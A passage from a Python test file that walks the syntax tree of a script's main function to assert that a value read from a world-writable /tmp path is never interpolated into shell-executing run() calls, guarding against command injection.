    The escrow argument and the injection argument are the same argument: an
    unverified value must not reach a privileged sink. This pins the second sink,
    which nobody enumerated when the fix was written.
    """
    fn = next(n for n in ast.walk(_TREE) if isinstance(n, ast.FunctionDef) and n.name == "main")
    shell_calls = [
        n
        for n in ast.walk(fn)
        if isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id == "run"
    ]
    assert shell_calls, "no run() calls found in main — re-anchor, do not delete"
    for call in shell_calls:
        names = {m.id for m in ast.walk(call) if isinstance(m, ast.Name)}
        assert "recovered_dseq" not in names, (
            "recovered_dseq is interpolated into a run() command; it is read from a "
            "world-writable /tmp path and reaches subprocess with shell=True"
        )
